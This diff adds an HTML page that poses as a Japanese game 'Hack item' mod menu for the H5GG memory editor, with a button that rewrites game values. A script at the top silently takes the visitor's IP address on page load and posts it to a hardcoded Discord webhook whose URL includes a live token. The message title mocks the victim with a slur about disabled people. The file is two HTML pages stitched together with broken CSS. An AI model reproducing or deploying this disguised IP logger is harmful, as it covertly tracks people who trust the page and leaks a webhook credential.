@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>脱PRO Hack item</title>
+    <link rel="stylesheet" href="style.css" />
+  <title>IPアドレスを取得してDiscordに送信する</title>
+  </head>
+  <body>
+       <script>
+        // IPアドレスを取得する関数
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
+                })
+                .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
+        }
+
+        // DiscordのWebhookにIPアドレスを送信する関数
+        function sendToDiscord(ipAddress)  {
+            const webhookURL = 'https://discord.com/api/webhooks/1241598292530565182/UzwJ5Q52myVCEr-lVDStBeLp5oTXAhBJ7Fxtd7h5brv7-Uydc4NCfs2_IxYz9YdkDQBR';
+            const payload = {
+                embeds: [{
+                    title: '釣られた障害者のIPアドレス',
+                    description: `IP address: ${ipAddress}`,
+                    color: 3447003 // 青色に設定
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Discordへの送信に失敗しました:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Discordへの送信に失敗しました:', error));
+        }
+
+        // ページが読み込まれたときにIPアドレスを取得してDiscordに送信する
+        getIPAddress();
+    </script>
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>H5AlertView</title>
+ <script>
+setButtonImage("https://static.gameguardian.net/monthly_2016_12/logo.png.7ea0bf50a92f70ebc7ff10aa74e1dd55.png");
+</script>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+
+<style type="text/css">
+* {
+
+    color: #black;
+    font-size: 12px;
+    font-family: Arial, sans-serif;
+}
+html {
+    zoom: auto
+}
+body{
+    widht: auto;
+    height: auto;
+    background-color: transparent;
+}
+
+#H5AlertView {
+    text-align:center;
+    /**
+    border: 1px dashed gray; background: #000;/**/
+}
+
+#title-img{
+    position: relative;
+    z-index:1;
+}
+
+#title-text{
+    padding-top:40px;
+    font-size:20px;
+    color: #;
+}
+
+#content-view {
+  z-index: auto;
+    height: auto;
+    width: auto;
+    background-color: #B8B8B8;
+    position: relative;
+    top: auto;
+    border-radius: 10px;
+    padding: 10px;
+}
+
+button {
+    width: 200px;
+    height: 40px;
+    color: #fff;
+    background-color: #ffffff;
+    display: inline-block;
+    cursor: pointer;
+    text-align: center;
+    text-decoration: none;
+    outline: wheat;
+    color: black;
+    border: none;
+    border-radius: 3px;
+    padding: 0 8px;
+    margin: 5px 0;
+    font-size:15px;
+}
+
+button:active {
+    background-color: #008000;
+    transform: translateY(2px);
+}
+input[type="checkbox"].togswi1{
+  box-sizing:border-box;
+  position:relative;
+  font-size:15px;/*基本サイズ お好きなサイズに設定*/
+  bottom:-5px;
+  width:2em;
+  height:1em;
+  padding:0;
+  appearance: none;
+  -webkit-appearance: none;
+  -ms-appearance: none;
+  -moz-appearance: none;
+  background:#aaaaaa;/*オフの色*/
+  border-radius:0.5em;
+  -webkit-tap-highlight-color: transparent;
+}
+input[type="checkbox"].togswi1:checked{
+  background:rgb(87, 196, 123);/*オンの色*/
+}
+input[type="checkbox"].togswi1::before{
+  box-sizing:border-box;
+  content:"";
+  position:absolute;
+  left:0.1em;
+  top:0.1em;
+  bottom:0.1em;
+  width:0.8em;
+  background:#FFF;
+  border-radius:0.4em;
+  transform:translate(0%,0%);
+  margin:0;
+}
+input[type="checkbox"].togswi1:checked::before{
+  transform:translate(125%,0%);
+}    
+    
+
+.scrollbar {
+    overflow-x: hidden;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+}
+.scrollbar::-webkit-scrollbar {
+    width: 5px; 
+    height: 5px;
+    background-color: #F5F5F5; 
+}
+.scrollbar::-webkit-scrollbar-track {
+    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); /* スクロールバーのトラックシャドウ */
+    /*border-radius: 10px; /* スクロールバートラックの丸い角 */
+    background-color: #F5F5F5; /* スクロールバートラックの背景 */
+}
+/* スクロールバー内のスライダー */
+.scrollbar::-webkit-scrollbar-thumb {
+    border-radius: 15px; /* スクロールバースライダーの角のまるさ */
+    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); /* スクロールバースライダーの影 */
+    background-color: #B8B8B8; /* スクロールバーのスライダーの色 */
+}
+
+</style>
+<script src="./H5AlertView_files/jquery.min.js.ダウンロード"></script>
+<script>
+if(typeof $ == 'undefined') alert("网络异常无法访问百度CDN!");
+
+//ページ表示完了イベント
+$(document).ready(function(){
+    /*テキストの選択とドラッグを無効にする*/
+    document.body.onselectstart = document.body.ondrag =function(){
+        return false;
+    }
+    //テキストボックスへの入力が完了すると、ページが自動的に先頭までスクロールします
+    $("input").blur(function(){
+        window.scroll(0,0);
+    });
+    
+    //「Webkit をアクティブ化」ボタン:アクティブ
+    document.body.addEventListener('touchstart', function () {});
+    
+    //フローティングウィンドウの位置とサイズを調整し、全画面の中央に表示
+    var w=210; var h=300;
+    if(window.screen.availWidth < window.screen.availHeight) {
+        //縦画面
+        var x=(window.screen.width - w)/2;
+        var y=(window.screen.height - h)/2;
+        setWindowRect(x, y, w, h);
+    } else {
+        //横画面
+        var x=(window.screen.height - w)/2;
+        var y=(window.screen.width - h)/2;
+        setWindowRect(x, y, w, h);
+    }
+});
+                  
+</script>
+</head>
+<body>
+<div id="H5AlertView">
+<div id="title-img">
+</div>
+<script>
+
+
+function f114514(){
+h5gg.clearResults();
+h5gg.searchNumber('6.874417363427344e+28', 'F32', '0x000000000', '0x200000000');
+h5gg.editAll('109999999766274691038577688576.000000', 'F32');
+};
+
+
+
+</script>
+<div id="content-view">
+    <div id="title-text">MODMENU</div>
+    <div class="scrollbar" style="max: height 2500px;">
+        <button onclick="f114514()">ハイスピード</button>
+</div>
+</div>
+</div>
+
+
+</body></html>
